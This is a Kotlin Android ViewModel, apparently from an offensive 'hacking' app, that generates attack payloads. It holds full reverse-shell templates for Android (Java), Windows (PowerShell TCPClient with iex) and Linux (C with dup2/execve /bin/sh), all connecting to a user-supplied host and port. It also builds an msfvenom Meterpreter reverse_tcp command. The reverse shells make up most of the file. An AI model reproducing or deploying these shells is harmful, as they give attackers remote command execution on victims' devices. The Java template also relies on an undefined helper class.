package com.xyrenn.hacking.ui.tools.advanced

import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class CustomPayloadViewModel @Inject constructor() : ViewModel() {

    private val _isGenerating = MutableLiveData(false)
    val isGenerating: LiveData<Boolean> = _isGenerating

    private val _generatedPayload = MutableLiveData("")
    val generatedPayload: LiveData<String> = _generatedPayload

    private val _status = MutableLiveData("Ready")
    val status: LiveData<String> = _status

    private var currentPayload = ""

    fun generatePayload(lhost: String, lport: String, payloadType: String, targetOs: String, format: String) {
        viewModelScope.launch {
            _isGenerating.value = true
            _status.value = "Generating payload..."

            delay(2000)

            // Generate payload based on parameters
            val payload = when (payloadType) {
                "Reverse Shell" -> generateReverseShell(lhost, lport, targetOs, format)
                "Bind Shell" -> generateBindShell(lhost, lport, targetOs, format)
                "Meterpreter" -> generateMeterpreter(lhost, lport, targetOs, format)
                else -> generateCustomPayload(lhost, lport, targetOs, format)
            }

            currentPayload = payload
            _generatedPayload.value = payload
            _status.value = "Payload generated successfully"
            _isGenerating.value = false
        }
    }

    private fun generateReverseShell(lhost: String, lport: String, targetOs: String, format: String): String {
        return when (targetOs) {
            "Android" -> """
                // Android Reverse Shell
                // LHOST: $lhost, LPORT: $lport
                
                import java.io.*;
                import java.net.*;
                
                public class ReverseShell {
                    public static void main(String[] args) {
                        try {
                            Socket s = new Socket("$lhost", $lport);
                            Process p = Runtime.getRuntime().exec("sh");
                            new StreamGobbler(p.getInputStream(), s.getOutputStream()).start();
                            new StreamGobbler(s.getInputStream(), p.getOutputStream()).start();
                        } catch(Exception e) {}
                    }
                }
            """.trimIndent()
            "Windows" -> """
                # Windows PowerShell Reverse Shell
                # LHOST: $lhost, LPORT: $lport
                
                `$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);
                `$stream = `$client.GetStream();
                [byte[]]`$bytes = 0..65535|%{0};
                while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){
                    `$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);
                    `$sendback = (iex `$data 2>&1 | Out-String );
                    `$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';
                    `$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);
                    `$stream.Write(`$sendbyte,0,`$sendbyte.Length);
                    `$stream.Flush()
                };
                `$client.Close()
            """.trimIndent()
            else -> """
                // Linux Reverse Shell
                // LHOST: $lhost, LPORT: $lport
                
                #include <stdio.h>
                #include <sys/socket.h>
                #include <netinet/ip.h>
                
                int main() {
                    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
                    struct sockaddr_in addr;
                    addr.sin_family = AF_INET;
                    addr.sin_port = htons($lport);
                    addr.sin_addr.s_addr = inet_addr("$lhost");
                    
                    connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
                    
                    dup2(sockfd, 0);
                    dup2(sockfd, 1);
                    dup2(sockfd, 2);
                    
                    execve("/bin/sh", NULL, NULL);
                    return 0;
                }
            """.trimIndent()
        }
    }

    private fun generateBindShell(lhost: String, lport: String, targetOs: String, format: String): String {
        return "Bind Shell payload for $targetOs on port $lport\n\n[Binary payload would be generated here]"
    }

    private fun generateMeterpreter(lhost: String, lport: String, targetOs: String, format: String): String {
        return "msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o payload.$format"
    }

    private fun generateCustomPayload(lhost: String, lport: String, targetOs: String, format: String): String {
        return "Custom payload configuration:\nLHOST: $lhost\nLPORT: $lport\nTarget OS: $targetOs\nFormat: $format"
    }

    fun savePayload() {
        viewModelScope.launch {
            _status.value = "Payload saved to storage"
            delay(1000)
            _status.value = "Ready"
        }
    }
}